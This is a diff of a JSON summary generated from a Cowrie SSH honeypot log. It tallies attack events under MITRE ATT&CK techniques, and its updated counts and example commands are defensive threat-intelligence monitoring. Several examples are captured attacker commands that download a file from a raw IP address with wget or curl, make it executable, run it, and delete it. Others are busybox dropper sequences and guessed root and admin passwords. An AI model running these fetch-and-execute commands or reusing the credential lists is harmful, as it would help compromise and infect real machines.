@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 09:01:44",
+  "generated": "2026-08-29 10:02:45",
   "totals": {
-    "commands": 272,
-    "login_failed": 475,
-    "login_success": 39,
-    "sessions": 657
+    "commands": 279,
+    "login_failed": 2541,
+    "login_success": 48,
+    "sessions": 2772
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 475,
+      "count": 2541,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,14 +21,14 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T09:00:51.944833Z",
-      "unique_ips": 37
+      "last": "2026-08-29T10:02:44.254765Z",
+      "unique_ips": 47
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 105,
+      "count": 106,
       "examples": [
         "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,8 +37,8 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-29T02:21:36.689252Z",
-      "last": "2026-08-29T06:42:19.871645Z",
-      "unique_ips": 5
+      "last": "2026-08-29T09:11:07.444976Z",
+      "unique_ips": 6
     },
     {
       "id": "T1105",
@@ -60,7 +60,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 39,
+      "count": 48,
       "examples": [
         "root / 123@@@",
         "ubuntu / ubuntu",
@@ -69,57 +69,61 @@
         "admin / 12345"
       ],
       "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T08:59:32.978898Z",
-      "unique_ips": 24
+      "last": "2026-08-29T10:02:25.966488Z",
+      "unique_ips": 32
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 6,
       "examples": [
-        "uname -a"
+        "uname -a",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-29T01:00:06.084418Z",
-      "last": "2026-08-29T03:24:57.991825Z",
-      "unique_ips": 3
+      "last": "2026-08-29T10:02:02.263642Z",
+      "unique_ips": 5
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-29T03:07:39.054930Z",
-      "last": "2026-08-29T04:57:10.326527Z",
-      "unique_ips": 2
+      "last": "2026-08-29T09:11:07.444976Z",
+      "unique_ips": 3
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 2,
+      "count": 3,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-29T06:42:19.551602Z",
-      "last": "2026-08-29T06:42:19.871645Z",
-      "unique_ips": 1
+      "last": "2026-08-29T09:11:07.444976Z",
+      "unique_ips": 2
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 1,
+      "count": 2,
       "examples": [
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-29T06:42:19.871645Z",
-      "last": "2026-08-29T06:42:19.871645Z",
-      "unique_ips": 1
+      "last": "2026-08-29T09:11:07.444976Z",
+      "unique_ips": 2
     },
     {
       "id": "T1562.004",
@@ -141,15 +145,15 @@
     ],
     [
       "system",
-      11
+      12
     ],
     [
       "shell",
-      11
+      12
     ],
     [
       "sh",
-      11
+      12
     ],
     [
       "enable",
@@ -184,6 +188,10 @@
       5
     ],
     [
+      "/bin/busybox UNSTABLE",
+      4
+    ],
+    [
       "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
       3
     ],
@@ -193,10 +201,6 @@
     ],
     [
       "rm /tmp/bendi.py",
-      3
-    ],
-    [
-      "/bin/busybox UNSTABLE",
       3
     ],
     [
